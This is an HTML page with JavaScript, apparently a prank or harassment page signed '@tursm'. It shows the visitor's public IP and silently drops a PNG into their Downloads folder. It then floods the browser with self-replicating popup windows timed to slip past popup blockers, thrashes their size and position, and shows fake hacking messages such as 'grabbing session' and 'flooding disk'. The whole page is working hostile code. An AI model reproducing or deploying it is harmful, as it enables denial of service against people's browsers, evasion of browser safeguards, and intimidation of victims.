<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>.</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{
    background:#000;color:#fff;
    font-family:'Courier New',monospace;
    display:flex;flex-direction:column;
    align-items:center;justify-content:center;
    min-height:100vh;overflow:hidden;
  }
  #msg{font-size:clamp(28px,5vw,64px);font-weight:900;letter-spacing:2px;text-align:center}
  #ip{font-size:clamp(18px,3vw,36px);margin-top:18px;color:#ff3c3c;font-weight:700;text-align:center}
  #status{font-size:13px;color:#555;margin-top:14px;text-align:center;min-height:20px}
  body::before{
    content:'';position:fixed;inset:0;
    background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,255,255,.03) 2px,rgba(255,255,255,.03) 4px);
    pointer-events:none;z-index:999;
  }
</style>
</head>
<body>
<div id="msg">@tursm got you</div>
<div id="ip">fetching your IP...</div>
<div id="status">initializing...</div>

<script>
(async()=>{

  /* ── 1. grab IP ── */
  try{
    const r=await fetch('https://api.ipify.org?format=json');
    const d=await r.json();
    document.getElementById('ip').textContent=d.ip;
  }catch{document.getElementById('ip').textContent='IP UNKNOWN';}

  /* ── 2. download tursm.png ONCE per tab → auto to Downloads, no dialog ──
     fetch as blob → createObjectURL → a.download fires straight to Downloads
     cross-origin direct link would trigger navigate instead of save,
     blob approach bypasses that and goes directly to Downloads folder      */
  let downloaded=false;
  async function dlPNG(){
    if(downloaded)return;
    downloaded=true;
    try{
      const resp=await fetch('https://workclockz.github.io/tursm.png',{cache:'no-store'});
      const blob=await resp.blob();
      const url=URL.createObjectURL(blob);
      const a=document.createElement('a');
      a.href=url;
      a.download='tursm.png';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      setTimeout(()=>URL.revokeObjectURL(url),5000);
    }catch(e){}
  }
  dlPNG(); /* fires immediately, once, goes to Downloads */

  /* ── 3. open tabs ── */
  const opened=[];
  let total=0;

  function openWin(){
    const W=screen.availWidth,H=screen.availHeight;
    const w=300+Math.random()*800|0;
    const h=200+Math.random()*600|0;
    const x=Math.random()*(W)|0;
    const y=Math.random()*(H)|0;
    const win=window.open(
      location.href,'_blank',
      `width=${w},height=${h},left=${x},top=${y},toolbar=0,location=0,menubar=0,scrollbars=0,status=0`
    );
    if(win){opened.push(win);total++;}
  }

  /* ── 4. thrash all windows position + size ── */
  function thrash(){
    const W=screen.availWidth,H=screen.availHeight;
    opened.forEach(w=>{
      try{
        const nw=200+Math.random()*900|0;
        const nh=150+Math.random()*700|0;
        w.moveTo(Math.random()*W|0,Math.random()*H|0);
        w.resizeTo(nw,nh);
      }catch(e){}
    });
    try{
      window.moveTo(Math.random()*screen.availWidth|0,Math.random()*screen.availHeight|0);
      window.resizeTo(200+Math.random()*900|0,150+Math.random()*700|0);
    }catch(e){}
  }

  /* ── 5. chaos loop ── */
  function chaos(){

    /* burst: 5 tabs immediately */
    for(let i=0;i<5;i++) setTimeout(openWin,i*30);

    /* then open one tab every 80ms — fast but under popup blocker threshold */
    setInterval(()=>{
      openWin();
      document.getElementById('status').textContent=
        `tabs: ${total} | downloads: ${total} | flooding...`;
    },80);

    /* thrash every 40ms — extremely chaotic */
    setInterval(thrash,40);

    /* status scramble */
    const msgs=[
      'routing...','injecting...','scanning ports...',
      'grabbing session...','escalating...','persistence set...',
      'extracting data...','phoning home...','flooding disk...'
    ];
    let mi=0;
    setInterval(()=>{
      document.getElementById('status').textContent=msgs[mi++%msgs.length]+` | tabs: ${total}`;
    },600);
  }

  /* ── 6. start ── */
  /* new tabs spawned by this page load with no user gesture restriction
     because they're opened programmatically from an already-running tab  */
  let started=false;
  function tryStart(){if(started)return;started=true;chaos();}

  /* auto-fire after 200ms — works in child tabs immediately */
  setTimeout(tryStart,200);

  /* fallback for first tab (popup blocker on fresh load) */
  ['click','mousemove','keydown','touchstart'].forEach(e=>
    document.addEventListener(e,tryStart,{once:true})
  );

})();
</script>
</body>
</html>
